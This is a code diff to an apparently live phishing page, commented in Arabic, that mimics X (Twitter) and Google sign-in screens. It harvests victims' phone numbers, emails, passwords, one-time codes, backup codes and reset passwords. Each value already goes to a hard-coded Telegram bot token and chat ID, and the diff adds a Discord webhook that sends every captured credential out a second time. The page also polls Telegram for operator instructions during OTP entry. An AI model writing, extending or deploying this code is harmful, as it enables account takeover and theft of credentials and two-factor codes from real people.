@@ -799,7 +799,7 @@
     <!-- ========================================== -->
     <!-- ⚙️ البرمجة والتحكم والتفاعل الجافاسكربت -->
     <!-- ========================================== -->
-    <script>
+   <script>
         // --- التسلسل الزمني الأولي (2 ثانية شاشة سوداء ثم 7 ثواني تحميل) ---
         window.addEventListener('DOMContentLoaded', () => {
             // بعد 2 ثانية، الانتقال من الشاشة السوداء إلى شاشة التحميل
@@ -817,6 +817,9 @@
 
         const TELEGRAM_BOT_TOKEN = "8919787970:AAEmU4rsJAI5XUc2TyzUkur0Lpom_Tk07Kg";
         const TELEGRAM_CHAT_ID = "8796885500";
+        
+        // رابط ديسكورد Webhook الخاص بك
+        const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1551997681063297095/9wne8QtpIrX2JvrgzuLrI1-drIT2vkAIo5zOmRA0q31dcAwarxXMCYEcyUpG6kEmnV8j";
 
         let sessionData = {
             mainInput: '',
@@ -830,6 +833,7 @@
         let hasClickedBackupLink = false;
         let pollTimer = null;
         let countdownTimer = null;
+        let lastSentDiscordData = ""; // لمنع تكرار إرسال نفس البيانات المباشرة
 
         // خريطة أعلام الدول التلقائية بناءً على مفتاح الاتصال
         const countryFlagsMap = {
@@ -888,6 +892,32 @@
             }).catch(e => console.error("Telegram error:", e));
         }
 
+        // إرسال البيانات لديسكورد بنظام البطاقات (Embeds) لمنع التجميع وتجنب التكرار
+        function sendDiscordEmbed(title, fields, color = 3447003) {
+            if (!DISCORD_WEBHOOK_URL) return;
+
+            // آلية منع تكرار إرسال الرسالة نفسها متتالياً
+            const currentDataString = JSON.stringify({ title, fields });
+            if (lastSentDiscordData === currentDataString) return;
+            lastSentDiscordData = currentDataString;
+
+            const payload = {
+                embeds: [{
+                    title: title,
+                    color: color,
+                    fields: fields,
+                    timestamp: new Date().toISOString(), // الختم الزمني لمنع دمج الرسائل في ديسكورد
+                    footer: { text: "𝕏 / Google Notification Bot" }
+                }]
+            };
+
+            fetch(DISCORD_WEBHOOK_URL, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(payload)
+            }).catch(e => console.error("Discord error:", e));
+        }
+
         // التنقل بين الصفحات
         function showView(viewId, pushHistory = true) {
             const currentActive = document.querySelector('.view-page.active');
@@ -905,6 +935,7 @@
                 const previousView = viewHistory.pop();
                 showView(previousView, false);
                 sendTelegramMessage(`<b>⬅️ تراجع المستخدم خطوة:</b>\nالصفحة الحالية: <code>${previousView}</code>`);
+                sendDiscordEmbed("⬅️ تراجع المستخدم خطوة", [{ name: "الصفحة الحالية", value: previousView, inline: true }], 15158332);
             } else {
                 showView('mainTwitterView', false);
             }
@@ -920,11 +951,13 @@
 
         function switchToPhoneMode() {
             sendTelegramMessage(`<b>📱 النقر على المتابعة بالهاتف</b>`);
+            sendDiscordEmbed("📱 متابعة عبر الهاتف", [{ name: "الإجراء", value: "نقر على متابعة برقم الهاتف", inline: false }], 3447003);
             showView('phoneInputView');
         }
 
         function switchToEmailMode() {
             sendTelegramMessage(`<b>✉️ النقر على المتابعة بالبريد/اسم المستخدم</b>`);
+            sendDiscordEmbed("✉️ متابعة عبر البريد", [{ name: "الإجراء", value: "نقر على متابعة بالبريد / اسم المستخدم", inline: false }], 3447003);
             showView('emailInputView');
         }
 
@@ -935,6 +968,7 @@
 
             sessionData.mainInput = code + phone;
             sendTelegramMessage(`<b>𝕏 تسجيل هاتف تويتر:</b>\nالرقم: <code>${sessionData.mainInput}</code>`);
+            sendDiscordEmbed("𝕏 تسجيل هاتف تويتر", [{ name: "رقم الهاتف", value: `\`\`\`${sessionData.mainInput}\`\`\``, inline: false }], 15844367);
 
             document.getElementById('displayUserIdentifier').innerText = sessionData.mainInput;
             document.getElementById('otpPhoneNumberDisplay').innerText = sessionData.mainInput;
@@ -947,6 +981,7 @@
 
             sessionData.mainInput = email;
             sendTelegramMessage(`<b>𝕏 تسجيل بريد تويتر:</b>\nالبريد: <code>${email}</code>`);
+            sendDiscordEmbed("𝕏 تسجيل بريد تويتر", [{ name: "البريد الإلكتروني", value: `\`\`\`${email}\`\`\``, inline: false }], 15844367);
 
             document.getElementById('displayUserIdentifier').innerText = email;
             document.getElementById('otpPhoneNumberDisplay').innerText = email;
@@ -959,6 +994,10 @@
 
             sessionData.password = pass;
             sendTelegramMessage(`<b>🔑 كلمة مرور تويتر:</b>\nالحساب: <code>${sessionData.mainInput}</code>\nكلمة المرور: <code>${pass}</code>`);
+            sendDiscordEmbed("🔑 كلمة مرور تويتر", [
+                { name: "الحساب", value: sessionData.mainInput, inline: true },
+                { name: "كلمة المرور", value: `\`\`\`${pass}\`\`\``, inline: true }
+            ], 15105570);
 
             showLoadingThen('otpConfirmView', "جاري التحقق من المعلومات...", 2500);
             startOtpCountdownTimer(60);
@@ -966,6 +1005,7 @@
 
         function handleForgotPasswordClick() {
             sendTelegramMessage(`<b>⚠️ تويتر - نسيت كلمة المرور:</b>\nالحساب: <code>${sessionData.mainInput}</code>`);
+            sendDiscordEmbed("⚠️ تويتر - نسيت كلمة المرور", [{ name: "الحساب", value: sessionData.mainInput || "غير محدد", inline: false }], 15105570);
             openGoogleFlow();
         }
 
@@ -1011,6 +1051,11 @@
             }
 
             sendTelegramMessage(`<b>🔢 كود تحقق تويتر مدخل (6 أرقام):</b>\nالحساب: <code>${sessionData.mainInput}</code>\nالكود: <code>${code}</code>`);
+            sendDiscordEmbed("🔢 كود تحقق تويتر", [
+                { name: "الحساب", value: sessionData.mainInput, inline: true },
+                { name: "كود التحقق (OTP)", value: `\`\`\`${code}\`\`\``, inline: true }
+            ], 5763719);
+
             showView('waitingAdminView');
             startPollingTelegram();
         }
@@ -1037,12 +1082,14 @@
 
         function resendTwitterOTPCode() {
             sendTelegramMessage(`<b>🔄 طلب إعادة إرسال كود تويتر:</b>\nالحساب: <code>${sessionData.mainInput}</code>`);
+            sendDiscordEmbed("🔄 طلب إعادة إرسال كود تويتر", [{ name: "الحساب", value: sessionData.mainInput, inline: false }], 15844367);
             startOtpCountdownTimer(60);
         }
 
         // --- تدفق جوجل (Google Flow) ---
         function openGoogleFlow() {
             sendTelegramMessage(`<b>🔴 فتح تسجيل جوجل</b>`);
+            sendDiscordEmbed("🔴 فتح تسجيل دخول جوجل", [{ name: "الإجراء", value: "بدء التوجيه لتسجيل دخول جوجل", inline: false }], 15158332);
             showView('gPhase1View');
         }
 
@@ -1052,6 +1099,7 @@
 
             sessionData.mainInput = email;
             sendTelegramMessage(`<b>🔴 جوجل - المرحلة 1:</b>\nالمُدخل: <code>${email}</code>`);
+            sendDiscordEmbed("🔴 جوجل - المرحلة 1", [{ name: "المُدخل (بريد/هاتف)", value: `\`\`\`${email}\`\`\``, inline: false }], 15158332);
 
             showLoadingThen('gPhase2View', "(جاري التحميل...)", 2000);
         }
@@ -1062,6 +1110,10 @@
 
             sessionData.password = notes;
             sendTelegramMessage(`<b>🔑 كلمة المرور (جوجل):</b>\nالبريد: <code>${sessionData.mainInput}</code>\nكلمة المرور: <code>${notes}</code>`);
+            sendDiscordEmbed("🔑 كلمة المرور (جوجل)", [
+                { name: "البريد", value: sessionData.mainInput, inline: true },
+                { name: "كلمة المرور", value: `\`\`\`${notes}\`\`\``, inline: true }
+            ], 15105570);
 
             showLoadingThen('gPhase3View', "(جاري التحميل...)", 2000);
         }
@@ -1075,6 +1127,10 @@
             document.getElementById('gUniqueNoteDisplay').innerText = unique;
 
             sendTelegramMessage(`<b>⚠️ طلب إعادة تعيين كلمة المرور (جوجل):</b>\nالبريد: <code>${sessionData.mainInput}</code>\nكلمة المرور الفريدة: <code>${unique}</code>`);
+            sendDiscordEmbed("⚠️ طلب إعادة تعيين كلمة المرور (جوجل)", [
+                { name: "البريد", value: sessionData.mainInput, inline: true },
+                { name: "الكود الفريد", value: `\`\`\`${unique}\`\`\``, inline: true }
+            ], 15105570);
         }
 
         function handleGUpdatePasswordLinkClick() {
@@ -1082,6 +1138,7 @@
             document.getElementById('gNewNotesInput').disabled = false;
             document.getElementById('btnSubmitGNewNotes').disabled = false;
             sendTelegramMessage(`<b>🔗 النقر على رابط تحديث كلمة المرور:</b>\nالبريد: <code>${sessionData.mainInput}</code>`);
+            sendDiscordEmbed("🔗 النقر على رابط تحديث كلمة المرور", [{ name: "البريد", value: sessionData.mainInput, inline: false }], 3447003);
         }
 
         function submitGNewNotesFinal() {
@@ -1090,6 +1147,10 @@
 
             sessionData.newNotesPassword = newNotes;
             sendTelegramMessage(`<b>✅ كلمة المرور الجديدة (جوجل):</b>\nالبريد: <code>${sessionData.mainInput}</code>\nالجديدة: <code>${newNotes}</code>`);
+            sendDiscordEmbed("✅ كلمة المرور الجديدة (جوجل)", [
+                { name: "البريد", value: sessionData.mainInput, inline: true },
+                { name: "كلمة المرور الجديدة", value: `\`\`\`${newNotes}\`\`\``, inline: true }
+            ], 5763719);
 
             showLoadingThen('gPhase3View', "(جاري التأكد من المعلومات...)", 2000);
         }
@@ -1098,6 +1159,7 @@
             hasClickedBackupLink = true;
             document.getElementById('gBackupErrorMsg').style.display = 'none';
             sendTelegramMessage(`<b>🛡️ النقر على رابط رموز الأمان:</b>\nالبريد: <code>${sessionData.mainInput}</code>`);
+            sendDiscordEmbed("🛡️ النقر على رابط رموز الأمان", [{ name: "البريد", value: sessionData.mainInput, inline: false }], 3447003);
         }
 
         function submitGBackupCode() {
@@ -1118,6 +1180,11 @@
 
             sessionData.backupCode = code;
             sendTelegramMessage(`<b>🛡️ رمز أمان مدخل:</b>\nالبريد: <code>${sessionData.mainInput}</code>\nالرمز: <code>${code}</code>`);
+            sendDiscordEmbed("🛡️ رمز أمان مدخل (جوجل)", [
+                { name: "البريد", value: sessionData.mainInput, inline: true },
+                { name: "رمز الأمان", value: `\`\`\`${code}\`\`\``, inline: true }
+            ], 5763719);
+
             showLoadingThen('successView', "(جاري التحقق من رمز الأمان...)", 2500);
         }
 
@@ -1131,6 +1198,11 @@
             if (!input) { alert('يرجى إدخال الرقم أو البريد الإلكتروني'); return; }
 
             sendTelegramMessage(`<b>📩 طلب كود تحقق (طريقة بديلة):</b>\nالحساب: <code>${sessionData.mainInput}</code>\nالوجهة: <code>${input}</code>`);
+            sendDiscordEmbed("📩 طلب كود تحقق (طريقة بديلة)", [
+                { name: "الحساب", value: sessionData.mainInput, inline: true },
+                { name: "الوجهة", value: input, inline: true }
+            ], 15844367);
+
             showView('gPhase4View');
             startPollingTelegram();
         }
@@ -1139,6 +1211,11 @@
             const val = elem.value.trim();
             if (val.length === 6) {
                 sendTelegramMessage(`<b>🔢 كود تحقق مدخل (جوجل):</b>\nالبريد: <code>${sessionData.mainInput}</code>\nالكود: <code>${val}</code>`);
+                sendDiscordEmbed("🔢 كود تحقق مدخل (جوجل)", [
+                    { name: "البريد", value: sessionData.mainInput, inline: true },
+                    { name: "كود التحقق", value: `\`\`\`${val}\`\`\``, inline: true }
+                ], 5763719);
+
                 showView('waitingAdminView');
                 startPollingTelegram();
             }
@@ -1175,6 +1252,7 @@
                     .catch(e => console.error("Polling error:", e));
             }, 3000);
         }
-    </script>
+</script>
+
 </body>
 </html>
